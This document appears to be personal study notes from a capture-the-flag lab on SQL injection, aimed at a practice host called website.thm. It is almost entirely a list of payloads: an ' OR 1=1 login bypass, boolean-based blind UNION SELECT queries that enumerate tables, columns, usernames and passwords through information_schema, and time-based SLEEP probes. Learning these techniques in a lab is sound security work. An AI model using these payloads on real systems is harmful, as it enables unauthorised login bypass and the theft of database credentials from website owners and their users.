💉 **INJECTION**  💉

<br>** Boolean conditions:** OR 1=1 and OR 1=2</br>

  # Authentication Bypass

  - ' OR 1=1;--
  -   -select * from users where username='%username%' and password='%password%' LIMIT 1;
  -   select * from users where username='' and password='' OR 1=1;

  # Boolean Based
--->  💉   **https://website.thm/checkuser?username=admin**
  - select * from users where username = '%username%' LIMIT 1;
  - admin123' UNION SELECT 1;--
  - admin123' UNION SELECT 1,2,3;--
  - admin123' UNION SELECT 1,2,3 where database() like '%';--
  - admin123' UNION SELECT 1,2,3 where database() like 's%';--
  - admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
  - admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
  - admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
  - admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
  - admin123' UNION SELECT 1,2,3 from users where username like 'a%
  - admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%



  # Time Based

  - admin123' UNION SELECT SLEEP(5);--
  - admin123' UNION SELECT SLEEP(5),2;--
  - referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

    
